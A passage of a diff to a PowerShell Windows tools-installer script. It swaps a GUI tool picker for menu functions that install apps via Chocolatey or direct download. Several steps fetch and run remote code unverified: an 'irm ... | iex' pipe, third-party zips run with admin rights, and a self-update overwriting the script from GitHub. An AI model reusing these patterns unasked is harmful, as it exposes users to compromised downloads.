-       Action={ Install-Choco; choco install everything -y } },
-
-    @{ ID=25; Name="Chrome";              Category="Apps";       Desc="Google Chrome browser";                   Tags="chrome,browser,google";
-       Action={ Install-Choco; choco install googlechrome -y } },
-
-    @{ ID=26; Name="Zen Browser";         Category="Apps";       Desc="Privacy-focused Firefox-based browser";   Tags="browser,zen,firefox,privacy";
-       Action={ $url = "https://github.com/zen-browser/desktop/releases/latest/download/zen.installer.exe"
-                Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\zen-installer.exe"
-                Start-Process "$env:TEMP\zen-installer.exe" -Wait } },
-
-    @{ ID=27; Name="Clone Elegant";       Category="Dev Tools";  Desc="Clone Afnan Elegant repo from GitHub";   Tags="git,clone,elegant";
-       Action={ Ensure-Git; git clone https://github.com/afnan-nex/Elegant } },
-
-    @{ ID=28; Name="CMD Color 0a";        Category="Tweaks";     Desc="Set CMD to green-on-black colour";        Tags="cmd,color,terminal";
-       Action={ irm 'https://raw.githubusercontent.com/afnan-nex/my-fav-scripts/main/cmd-clr-to-0a.cmd' | iex } },
-
-    @{ ID=29; Name="OBS Studio";          Category="Apps";       Desc="Screen recording and streaming";          Tags="obs,recording,streaming";
-       Action={ Install-Choco; choco install obs-studio -y } },
-
-    @{ ID=30; Name="RustDesk";            Category="Apps";       Desc="Open-source remote desktop tool";         Tags="remote,desktop,rdp";
-       Action={ Install-Choco; choco install rustdesk -y } },
-
-    @{ ID=31; Name="HiBit Uninstaller";   Category="Utilities";  Desc="Advanced program uninstaller";            Tags="uninstall,clean,remove";
-       Action={ $url = "https://www.hibitsoft.ir/HiBitUninstaller/HiBitUninstaller-setup-4.0.10.exe"
-                Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\HiBitSetup.exe"
-                Start-Process "$env:TEMP\HiBitSetup.exe" -Wait } },
-
-    @{ ID=32; Name="Scrcpy GUI";          Category="Utilities";  Desc="Android screen mirror GUI app";           Tags="android,mirror,scrcpy";
-       Action={ $url = "https://github.com/pizi-0/flutter-scrcpygui/releases/download/1.4.18/scrcpygui-1.4.18-win.exe"
-                Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\ScrcpyGUI_Setup.exe"
-                Start-Process "$env:TEMP\ScrcpyGUI_Setup.exe" -Wait } },
-
-    @{ ID=33; Name="LocalSend";           Category="Apps";       Desc="LAN file sharing like AirDrop";           Tags="share,lan,file,local";
-       Action={ Install-Choco; choco install localsend -y } },
-
-    @{ ID=34; Name="Notepad++";           Category="Apps";       Desc="Advanced text and code editor";           Tags="editor,notepad,text";
-       Action={ Install-Choco; choco install notepadplusplus -y } },
-
-    @{ ID=35; Name="ShareX";              Category="Apps";       Desc="Screenshot and screen recorder";          Tags="screenshot,capture,sharex";
-       Action={ Install-Choco; choco install sharex -y } },
-
-    @{ ID=36; Name="VC++ Runtimes";       Category="System";     Desc="All Visual C++ redistributables";         Tags="vcredist,runtime,microsoft";
-       Action={ $url = "https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.0/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
-                $zip = "$env:TEMP\VC_Runtimes.zip"
-                Invoke-WebRequest -Uri $url -OutFile $zip
-                if (Test-Path "$env:TEMP\VC_Runtimes") { Remove-Item "$env:TEMP\VC_Runtimes" -Recurse -Force }
-                Expand-Archive -Path $zip -DestinationPath "$env:TEMP\VC_Runtimes" -Force
-                $is = Get-ChildItem "$env:TEMP\VC_Runtimes" -Filter "install_all.bat" -Recurse | Select-Object -First 1
-                if ($is) { Start-Process $is.FullName -Verb RunAs } } },
-
-    @{ ID=37; Name="DirectX";             Category="System";     Desc="DirectX redistributable Jun 2010";        Tags="directx,dx,gaming,runtime";
-       Action={ $url = "https://github.com/planetshine0000/direct-x/releases/download/v1.0.0/DirectX-Redist-Jun-2010.zip"
-                $zip = "$env:TEMP\DirectX.zip"
-                Invoke-WebRequest -Uri $url -OutFile $zip
-                if (Test-Path "$env:TEMP\DirectX_Install") { Remove-Item "$env:TEMP\DirectX_Install" -Recurse -Force }
-                Expand-Archive -Path $zip -DestinationPath "$env:TEMP\DirectX_Install" -Force
-                $s = Get-ChildItem "$env:TEMP\DirectX_Install" -Filter "DXSETUP.exe" -Recurse | Select-Object -First 1
-                if ($s) { Start-Process $s.FullName -Verb RunAs } } }
-)
-
-# --- State ---
-$checkboxMap = @{}
-
-$catColors = @{
-    "Essential"  = [System.Drawing.Color]::FromArgb(34,  197, 94)
-    "Dev Tools"  = [System.Drawing.Color]::FromArgb(59,  130, 246)
-    "Utilities"  = [System.Drawing.Color]::FromArgb(168, 85,  247)
-    "Apps"       = [System.Drawing.Color]::FromArgb(249, 115, 22)
-    "AI"         = [System.Drawing.Color]::FromArgb(236, 72,  153)
-    "Automation" = [System.Drawing.Color]::FromArgb(20,  184, 166)
-    "Scripts"    = [System.Drawing.Color]::FromArgb(234, 179, 8)
-    "System"     = [System.Drawing.Color]::FromArgb(148, 163, 184)
-    "Tweaks"     = [System.Drawing.Color]::FromArgb(251, 146, 60)
-    "Info"       = [System.Drawing.Color]::FromArgb(99,  102, 241)
-}
-
-# --- Button Factory ---
-function Make-Button($text, $x, $y, $w, $h, $bg, $fg, $font) {
-    $b = New-Object System.Windows.Forms.Button
-    $b.Text = $text
-    $b.Location = New-Object System.Drawing.Point($x, $y)
-    $b.Size = New-Object System.Drawing.Size($w, $h)
-    $b.BackColor = $bg; $b.ForeColor = $fg; $b.Font = $font
-    $b.FlatStyle = "Flat"; $b.FlatAppearance.BorderSize = 0
-    $b.Cursor = [System.Windows.Forms.Cursors]::Hand
-    $hover = [System.Drawing.Color]::FromArgb(
-        [Math]::Min($bg.R + 25, 255),
-        [Math]::Min($bg.G + 25, 255),
-        [Math]::Min($bg.B + 25, 255))
-    $b.FlatAppearance.MouseOverBackColor = $hover
-    return $b
-}
-
-# --- Log helper (thread-safe) ---
-function Write-Log($msg, $colour) {
-    if (-not $colour) { $colour = $c.Text }
-    $script:logBox.Invoke([System.Action]{
-        $script:logBox.SelectionStart  = $script:logBox.TextLength
-        $script:logBox.SelectionLength = 0
-        $script:logBox.SelectionColor  = $colour
-        $ts = Get-Date -Format "HH:mm:ss"
-        $script:logBox.AppendText("[$ts] $msg`n")
-        $script:logBox.ScrollToCaret()
-    })
-}
-
-# ============================================================
-# FORM
-# ============================================================
-$form = New-Object System.Windows.Forms.Form
-$form.Text           = "Tools Installer  by Afnan  v2.0"
-$form.Size           = New-Object System.Drawing.Size(1060, 820)
-$form.MinimumSize    = New-Object System.Drawing.Size(900, 700)
-$form.BackColor      = $c.Bg
-$form.ForeColor      = $c.Text
-$form.Font           = $fNorm
-$form.StartPosition  = "CenterScreen"
-$form.DoubleBuffered = $true
-
-# ---- Header ----
-$header = New-Object System.Windows.Forms.Panel
-$header.Dock = "Top"; $header.Height = 66; $header.BackColor = $c.Surface
-$form.Controls.Add($header)
-
-$titleLbl = New-Object System.Windows.Forms.Label
-$titleLbl.Text = "Tools Installer"
-$titleLbl.Font = $fTitle; $titleLbl.ForeColor = $c.Accent
-$titleLbl.Location = New-Object System.Drawing.Point(20, 12); $titleLbl.AutoSize = $true
-$header.Controls.Add($titleLbl)
-
-$subLbl = New-Object System.Windows.Forms.Label
-$subLbl.Text = "by Afnan Siddiqui  |  v2.0  |  Select tools and click Run Selected"
-$subLbl.Font = $fSmall; $subLbl.ForeColor = $c.TextDim
-$subLbl.Location = New-Object System.Drawing.Point(22, 46); $subLbl.AutoSize = $true
-$header.Controls.Add($subLbl)
-
-$selCount = New-Object System.Windows.Forms.Label
-$selCount.Text = "0 selected"; $selCount.Font = $fBold; $selCount.ForeColor = $c.Accent
-$selCount.AutoSize = $true
-$selCount.Anchor = [System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Right
-$header.Controls.Add($selCount)
-$header.Add_Resize({
-    $selCount.Location = New-Object System.Drawing.Point(($header.Width - $selCount.Width - 20), 24)
-})
-
-# ---- Search Bar ----
-$searchPanel = New-Object System.Windows.Forms.Panel
-$searchPanel.Dock = "Top"; $searchPanel.Height = 44; $searchPanel.BackColor = $c.Bg
-$form.Controls.Add($searchPanel)
-
-$searchLbl = New-Object System.Windows.Forms.Label
-$searchLbl.Text = "Search:"; $searchLbl.Font = $fSmall; $searchLbl.ForeColor = $c.TextDim
-$searchLbl.Location = New-Object System.Drawing.Point(20, 14); $searchLbl.AutoSize = $true
-$searchPanel.Controls.Add($searchLbl)
-
-$searchBox = New-Object System.Windows.Forms.TextBox
-$searchBox.Location  = New-Object System.Drawing.Point(70, 10)
-$searchBox.Size      = New-Object System.Drawing.Size(340, 26)
-$searchBox.BackColor = $c.Surface2; $searchBox.ForeColor = $c.Text
-$searchBox.Font      = $fNorm; $searchBox.BorderStyle = "FixedSingle"
-$searchPanel.Controls.Add($searchBox)
-
-$clearSearchBtn = Make-Button "X" 416 10 26 26 $c.Surface2 $c.TextDim $fSmall
-$clearSearchBtn.Add_Click({ $searchBox.Text = "" })
-$searchPanel.Controls.Add($clearSearchBtn)
-
-# ---- Main SplitContainer ----
-$split = New-Object System.Windows.Forms.SplitContainer
-$split.Dock             = "Fill"
-$split.BackColor        = $c.Bg
-$split.SplitterWidth    = 5
-$split.SplitterDistance = 615
-$split.Panel1MinSize    = 480
-$split.Panel2MinSize    = 240
-$form.Controls.Add($split)
-
-# ---- LEFT: TabControl ----
-$tabCtrl = New-Object System.Windows.Forms.TabControl
-$tabCtrl.Dock      = "Fill"
-$tabCtrl.DrawMode  = [System.Windows.Forms.TabDrawMode]::OwnerDrawFixed
-$tabCtrl.ItemSize  = New-Object System.Drawing.Size(108, 28)
-$tabCtrl.SizeMode  = [System.Windows.Forms.TabSizeMode]::Fixed
-$tabCtrl.BackColor = $c.Bg
-$split.Panel1.Controls.Add($tabCtrl)
-
-$tabCtrl.Add_DrawItem({
-    param($s, $e)
-    $tab   = $tabCtrl.TabPages[$e.Index]
-    $rect  = $e.Bounds
-    $isSel = ($e.Index -eq $tabCtrl.SelectedIndex)
-    $bg    = if ($isSel) { $c.TabSel } else { $c.Surface }
-    $fg    = if ($isSel) { $c.Accent } else { $c.TextDim }
-    $bgBrush = New-Object System.Drawing.SolidBrush($bg)
-    $e.Graphics.FillRectangle($bgBrush, $rect)
-    if ($isSel) {
-        $ab = New-Object System.Drawing.SolidBrush($c.Accent)
-        $e.Graphics.FillRectangle($ab, [System.Drawing.Rectangle]::new($rect.X, $rect.Bottom - 3, $rect.Width, 3))
-        $ab.Dispose()
-    }
-    $fmt = New-Object System.Drawing.StringFormat
-    $fmt.Alignment     = [System.Drawing.StringAlignment]::Center
-    $fmt.LineAlignment = [System.Drawing.StringAlignment]::Center
-    $fgBrush = New-Object System.Drawing.SolidBrush($fg)
-    $e.Graphics.DrawString($tab.Text, $fSmall, $fgBrush, [System.Drawing.RectangleF]$rect, $fmt)
-    $bgBrush.Dispose(); $fgBrush.Dispose()
-})
-
-$categories = $tools | Group-Object Category
-
-foreach ($cat in $categories) {
-    $tp = New-Object System.Windows.Forms.TabPage
-    $tp.Text = $cat.Name; $tp.BackColor = $c.Bg
-
-    $fp = New-Object System.Windows.Forms.FlowLayoutPanel
-    $fp.Dock      = "Fill"
-    $fp.Padding   = New-Object System.Windows.Forms.Padding(10)
-    $fp.AutoScroll = $true
-    $fp.BackColor  = $c.Bg
-    $tp.Controls.Add($fp)
-
-    foreach ($tool in $cat.Group) {
-        # Card
-        $card = New-Object System.Windows.Forms.Panel
-        $card.Size      = New-Object System.Drawing.Size(268, 66)
-        $card.BackColor = $c.Surface
-        $card.Margin    = New-Object System.Windows.Forms.Padding(4)
-        $card.Cursor    = [System.Windows.Forms.Cursors]::Hand
-
-        # Checkbox (name)
-        $cb = New-Object System.Windows.Forms.CheckBox
-        $cb.Size      = New-Object System.Drawing.Size(248, 20)
-        $cb.Location  = New-Object System.Drawing.Point(10, 9)
-        $cb.Text      = $tool.Name
-        $cb.Font      = $fBold
-        $cb.ForeColor = $c.Text
-        $cb.BackColor = [System.Drawing.Color]::Transparent
-        $cb.Tag       = $tool
-        $cb.FlatStyle = "Flat"
-
-        # Description
-        $descLbl = New-Object System.Windows.Forms.Label
-        $descLbl.Text      = $tool.Desc
-        $descLbl.Font      = $fSmall
-        $descLbl.ForeColor = $c.TextDim
-        $descLbl.Location  = New-Object System.Drawing.Point(28, 32)
-        $descLbl.Size      = New-Object System.Drawing.Size(232, 16)
-        $descLbl.BackColor = [System.Drawing.Color]::Transparent
-
-        # Colour dot (category indicator)
-        $dot = New-Object System.Windows.Forms.Label
-        $dot.Size      = New-Object System.Drawing.Size(8, 8)
-        $dot.Location  = New-Object System.Drawing.Point(246, 7)
-        $dot.BackColor = if ($catColors.ContainsKey($tool.Category)) { $catColors[$tool.Category] } else { $c.TextDim }
-
-        # Capture loop vars for closures
-        $localCard      = $card
-        $localCb        = $cb
-        $checkedBgColor = [System.Drawing.Color]::FromArgb(45, 99, 102, 241)
-        $normalBgColor  = $c.Surface
-        $hoveredBgColor = $c.Surface2
-
-        $localCard.Add_MouseEnter({ $localCard.BackColor = $hoveredBgColor })
-        $localCard.Add_MouseLeave({ $localCard.BackColor = if ($localCb.Checked) { $checkedBgColor } else { $normalBgColor } })
-        $localCb.Add_MouseEnter({ $localCard.BackColor = $hoveredBgColor })
-        $localCb.Add_MouseLeave({ $localCard.BackColor = if ($localCb.Checked) { $checkedBgColor } else { $normalBgColor } })
-        $localCard.Add_Click({ $localCb.Checked = -not $localCb.Checked })
-
-        $localCb.Add_CheckedChanged({
-            $cnt = ($checkboxMap.Values | Where-Object { $_.Checked }).Count
-            $selCount.Text = "$cnt selected"
-            $localCard.BackColor = if ($localCb.Checked) { $checkedBgColor } else { $normalBgColor }
-        })
-
-        $localCard.Controls.AddRange(@($localCb, $descLbl, $dot))
-        $fp.Controls.Add($localCard)
-        $checkboxMap[$tool.ID] = $localCb
-    }
-
-    $tabCtrl.TabPages.Add($tp)
-}
-
-# ---- RIGHT: Log Panel ----
-$rightPanel = New-Object System.Windows.Forms.Panel
-$rightPanel.Dock      = "Fill"
-$rightPanel.BackColor = $c.Bg
-$split.Panel2.Controls.Add($rightPanel)
-
-$logTitle = New-Object System.Windows.Forms.Label
-$logTitle.Text      = "  Output Log"
-$logTitle.Font      = $fBold
-$logTitle.ForeColor = $c.TextDim
-$logTitle.Dock      = "Top"
-$logTitle.Height    = 28
-$logTitle.BackColor = $c.Surface
-$logTitle.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
-$rightPanel.Controls.Add($logTitle)
-
-$script:logBox = New-Object System.Windows.Forms.RichTextBox
-$script:logBox.Dock        = "Fill"
-$script:logBox.BackColor   = $c.Bg
-$script:logBox.ForeColor   = $c.Text
-$script:logBox.Font        = $fMono
-$script:logBox.ReadOnly    = $true
-$script:logBox.BorderStyle = "None"
-$script:logBox.ScrollBars  = "Vertical"
-$rightPanel.Controls.Add($script:logBox)
-
-$clearLogBtn = Make-Button "Clear Log" 0 0 0 24 $c.Surface2 $c.TextDim $fSmall
-$clearLogBtn.Dock = "Bottom"
-$clearLogBtn.Add_Click({ $script:logBox.Clear() })
-$rightPanel.Controls.Add($clearLogBtn)
-
-# ---- Bottom Action Bar ----
-$bottomBar = New-Object System.Windows.Forms.Panel
-$bottomBar.Dock      = "Bottom"
-$bottomBar.Height    = 72
-$bottomBar.BackColor = $c.Surface
-$form.Controls.Add($bottomBar)
-
-$prog = New-Object System.Windows.Forms.ProgressBar
-$prog.Location   = New-Object System.Drawing.Point(16, 8)
-$prog.Size       = New-Object System.Drawing.Size(1010, 5)
-$prog.Style      = "Continuous"
-$prog.BackColor  = $c.Surface2
-$prog.ForeColor  = $c.Accent
-$prog.Anchor     = [System.Windows.Forms.AnchorStyles]::Left -bor
-                   [System.Windows.Forms.AnchorStyles]::Right -bor
-                   [System.Windows.Forms.AnchorStyles]::Top
-$bottomBar.Controls.Add($prog)
-
-$btnSelAll  = Make-Button "Select All"    16  22  100 36 $c.Surface2                                    $c.Text    $fSmall
-$btnSelNone = Make-Button "Deselect All"  122 22  100 36 $c.Surface2                                    $c.Text    $fSmall
-$btnRun     = Make-Button "Run Selected"  234 22  150 36 $c.Accent                                      $c.Text    $fBold
-$btnRec     = Make-Button "Recommended"   392 22  150 36 ([System.Drawing.Color]::FromArgb(30,100,55))  $c.Text    $fBold
-$btnUpd     = Make-Button "Self Update"   550 22  130 36 $c.Surface2                                    $c.TextDim $fSmall
-
-$bottomBar.Controls.AddRange(@($btnSelAll, $btnSelNone, $btnRun, $btnRec, $btnUpd))
-
-# ---- Search Logic ----
-$searchBox.Add_TextChanged({
-    $q = $searchBox.Text.Trim().ToLower()
-    if ($q -eq "") {
-        foreach ($kv in $checkboxMap.GetEnumerator()) { $kv.Value.Parent.Visible = $true }
-        return
-    }
-    foreach ($kv in $checkboxMap.GetEnumerator()) {
-        $t   = $tools | Where-Object { $_.ID -eq $kv.Key }
-        $hit = ($t.Name     -like "*$q*") -or
-               ($t.Desc     -like "*$q*") -or
-               ($t.Tags     -like "*$q*") -or
-               ($t.Category -like "*$q*")
-        $kv.Value.Parent.Visible = $hit
-    }
-})
-
-# ---- Select All / None ----
-$btnSelAll.Add_Click({
-    $checkboxMap.Values | ForEach-Object { $_.Checked = $true }
-})
-$btnSelNone.Add_Click({
-    $checkboxMap.Values | ForEach-Object { $_.Checked = $false }
-})
-
-# ---- Run Selected (BackgroundWorker keeps UI responsive) ----
-$btnRun.Add_Click({
-    $selected = $checkboxMap.Values | Where-Object { $_.Checked }
-    if ($selected.Count -eq 0) {
-        [System.Windows.Forms.MessageBox]::Show(
-            "Please select at least one tool.", "No Selection", "OK", "Warning") | Out-Null
-        return
-    }
-
-    $btnRun.Enabled = $false; $btnRec.Enabled = $false
-    $selectedTools  = @($selected | ForEach-Object { $_.Tag })
-
-    $worker = New-Object System.ComponentModel.BackgroundWorker
-    $worker.WorkerReportsProgress = $true
-
-    $worker.Add_DoWork({
-        param($s, $e)
-        $tlist = $e.Argument
-        $tot   = $tlist.Count
-        $i     = 0
-        foreach ($t in $tlist) {
-            $i++
-            $pct = [int](($i - 1) / $tot * 100)
-            $s.ReportProgress($pct, "Starting: $($t.Name)")
-            try {
-                & $t.Action
-                $s.ReportProgress([int]($i / $tot * 100), "Done: $($t.Name)")
-            } catch {
-                $s.ReportProgress(-1, "FAILED: $($t.Name) -- $($_.Exception.Message)")
-            }
-        }
-    })
-
-    $worker.Add_ProgressChanged({
-        param($s, $e)
-        if ($e.ProgressPercentage -ge 0) {
-            $prog.Value = [Math]::Min($e.ProgressPercentage, 100)
-            Write-Log $e.UserState $c.Text
-        } else {
-            Write-Log $e.UserState $c.Red
-        }
-    })
-
-    $worker.Add_RunWorkerCompleted({
-        $prog.Value = 100
-        Write-Log "--- All tasks completed ---" $c.Green
-        $btnRun.Enabled = $true; $btnRec.Enabled = $true
-        [System.Windows.Forms.MessageBox]::Show(
-            "All selected tasks completed!", "Done", "OK", "Information") | Out-Null
-        $prog.Value = 0
-    })
-
-    $worker.RunWorkerAsync($selectedTools)
-})
-
-# ---- Recommended Preset ----
-$btnRec.Add_Click({
-    $recIds = @(4, 5, 9, 10, 12, 13, 15, 24, 25, 29, 34, 28)
-    $checkboxMap.Values | ForEach-Object { $_.Checked = $false }
-    $recIds | ForEach-Object { if ($checkboxMap.ContainsKey($_)) { $checkboxMap[$_].Checked = $true } }
-
-    $names = ($tools | Where-Object { $recIds -contains $_.ID } | ForEach-Object { "  - $($_.Name)" }) -join "`n"
-    $r = [System.Windows.Forms.MessageBox]::Show(
-        "The following tools will be installed:`n`n$names`n`nProceed?",
-        "Recommended Install", "YesNo", "Question")
-    if ($r -eq "Yes") { $btnRun.PerformClick() }
-})
-
-# ---- Self Update ----
-$btnUpd.Add_Click({
-    $url = "https://raw.githubusercontent.com/afnan-nex/tools-installer/main/tools-installer.ps1"
-    Write-Log "Checking for updates from GitHub..." $c.Yellow
+function CMD0A {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Changing CMD color to 0a" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
     try {
-        $content = (Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop).Content
-        if ($content.Length -gt 1000) {
-            $content | Set-Content $PSCommandPath -Encoding UTF8
-            Write-Log "Script updated! Please restart to apply changes." $c.Green
-            [System.Windows.Forms.MessageBox]::Show(
-                "Script updated! Please restart to apply changes.", "Updated", "OK", "Information") | Out-Null
-            $form.Close()
-        } else {
-            Write-Log "Update content too short - aborted for safety." $c.Yellow
-        }
+        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/afnan-nex/my-fav-scripts/main/cmd-clr-to-0a.cmd' -OutFile 'cmd-clr-to-0a.cmd'
+        Start-Process 'cmd-clr-to-0a.cmd'
+        Write-Host "CMD color script downloaded and executed." -ForegroundColor Green
     } catch {
-        Write-Log "Update failed: $($_.Exception.Message)" $c.Red
+        Write-Host "Error downloading script: $($_.Exception.Message)" -ForegroundColor Red
     }
-})
+    Write-Host ""
+    Pause
+}
 
-# ---- Startup messages ----
-Write-Log "Tools Installer v2.0 ready." $c.Accent
-Write-Log "Tip: Type in the search box to filter tools by name, category, or tag." $c.TextDim
+function OBS {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing OBS Studio" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    if (Get-Command obs64 -ErrorAction SilentlyContinue) {
+        Write-Host "OBS Studio is already installed." -ForegroundColor Green
+    } else {
+        Write-Host "Installing OBS Studio..." -ForegroundColor Yellow
+        choco install obs-studio -y
+    }
+    Write-Host ""
+    Pause
+}
 
-[void]$form.ShowDialog()
+function RUSTDESK {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing RustDesk" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    Write-Host "Installing RustDesk..." -ForegroundColor Yellow
+    choco install rustdesk -y
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "RustDesk installation failed." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function HIBIT {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing HiBit Uninstaller" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+        Write-Host "Curl is required but not found." -ForegroundColor Red
+        Pause
+        return
+    }
+
+    Write-Host "Downloading HiBit Uninstaller..." -ForegroundColor Yellow
+    $hibitUrl = "https://www.hibitsoft.ir/HiBitUninstaller/HiBitUninstaller-setup-4.0.10.exe"
+    $hibitPath = "$env:TEMP\HiBitSetup.exe"
+    Invoke-WebRequest -Uri $hibitUrl -OutFile $hibitPath
+
+    if (Test-Path $hibitPath) {
+        Write-Host "Running installer..." -ForegroundColor Green
+        Start-Process -Wait $hibitPath
+        Write-Host "Cleaning up..." -ForegroundColor Gray
+        Remove-Item $hibitPath -Force
+    } else {
+        Write-Host "Failed to download HiBit Uninstaller." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function SCRCPY {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Scrcpy GUI" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+        Write-Host "Curl is required but not found." -ForegroundColor Red
+        Pause
+        return
+    }
+
+    Write-Host "Downloading Scrcpy GUI..." -ForegroundColor Yellow
+    $scrcpyUrl = "https://github.com/pizi-0/flutter-scrcpygui/releases/download/1.4.18/scrcpygui-1.4.18-win.exe"
+    $scrcpyPath = "$env:TEMP\ScrcpyGUI_Setup.exe"
+    Invoke-WebRequest -Uri $scrcpyUrl -OutFile $scrcpyPath
+
+    if (Test-Path $scrcpyPath) {
+        Write-Host "Running installer..." -ForegroundColor Green
+        Start-Process -Wait $scrcpyPath
+        Write-Host "Cleaning up..." -ForegroundColor Gray
+        Remove-Item $scrcpyPath -Force
+    } else {
+        Write-Host "Failed to download Scrcpy GUI." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function LOCALSEND {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing LocalSend" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    Write-Host "Installing LocalSend..." -ForegroundColor Yellow
+    choco install localsend -y
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "LocalSend installation failed." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function NOTEPADPP {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Notepad++" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    Write-Host "Installing Notepad++..." -ForegroundColor Yellow
+    choco install notepadplusplus -y
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "Notepad++ installation failed." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function SHAREX {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing ShareX" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "Chocolatey is required. Installing Chocolatey first..." -ForegroundColor Yellow
+        CHOCO
+    }
+    Write-Host "Installing ShareX..." -ForegroundColor Yellow
+    choco install sharex -y
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "ShareX installation failed." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function VCREDIST {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing Visual C++ Runtimes" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+        Write-Host "Curl is required but not found." -ForegroundColor Red
+        Pause
+        return
+    }
+
+    $zipUrl = "https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.0/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
+    $zipFile = "$env:TEMP\VC_Runtimes.zip"
+    $extractDir = "$env:TEMP\VC_Runtimes_Temp"
+
+    Write-Host "Downloading Visual C++ Runtimes..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
+
+    if (Test-Path $zipFile) {
+        Write-Host "Extracting files..." -ForegroundColor Gray
+        if (-not (Test-Path $extractDir)) { New-Item -ItemType Directory -Path $extractDir | Out-Null }
+        Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
+
+        Write-Host "Running install_all.bat as Administrator..." -ForegroundColor Yellow
+        $installBat = Get-ChildItem -Recurse -Filter "install_all.bat" -Path $extractDir | Select-Object -First 1
+        if ($installBat) {
+            Start-Process -FilePath $installBat.FullName -Verb RunAs
+        }
+        
+        Write-Host "Cleaning up ZIP file..." -ForegroundColor Gray
+        Remove-Item $zipFile -Force
+        Write-Host "Note: The temporary extraction folder was left intact because the installer runs separately." -ForegroundColor Gray
+    } else {
+        Write-Host "Failed to download Visual C++ Runtimes." -ForegroundColor Red
+    }
+    Write-Host ""
+    Pause
+}
+
+function DIRECTX {
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "Installing DirectX Runtime" -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+
+    # 1. Check for Curl
+    if (-not (Get-Command curl -ErrorAction SilentlyContinue)) {
+        Write-Host "[ERROR] Curl is required but not found." -ForegroundColor Red
+        Pause
+        return
+    }
+
+    # 2. Setup Directories
+    $tempDir = "$env:TEMP\DirectX_Install"
+    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
+
+    $dxUrl = "https://github.com/planetshine0000/direct-x/releases/download/v1.0.0/DirectX-Redist-Jun-2010.zip"
+    $dxZip = "$tempDir\DirectX.zip"
+
+    # 3. Download
+    if (-not (Test-Path $dxZip)) {
+        Write-Host "Downloading DirectX..." -ForegroundColor Yellow
+        Invoke-WebRequest -Uri $dxUrl -OutFile $dxZip
+    } else {
+        Write-Host "DirectX zip already exists, skipping download." -ForegroundColor Gray
+    }
+
+    # 4. Unblock and Extract
+    Write-Host "Preparing files..." -ForegroundColor Gray
+    Unblock-File -Path $dxZip -ErrorAction SilentlyContinue
+    Expand-Archive -Path $dxZip -DestinationPath $tempDir -Force
+
+    # 5. Locate DXSETUP.exe
+    Write-Host "Locating DXSETUP.exe..." -ForegroundColor Gray
+    $dxSetup = Get-ChildItem -Recurse -Filter "DXSETUP.exe" -Path $tempDir | Select-Object -First 1
+
+    if (-not $dxSetup) {
+        Write-Host "[ERROR] DXSETUP.exe not found in extracted files." -ForegroundColor Red
+        Pause
+        return
+    }
+
+    # 6. Run as Admin
+    Write-Host "Found DXSETUP at: $($dxSetup.FullName)" -ForegroundColor Green
+    Write-Host "Launching installer..." -ForegroundColor Yellow
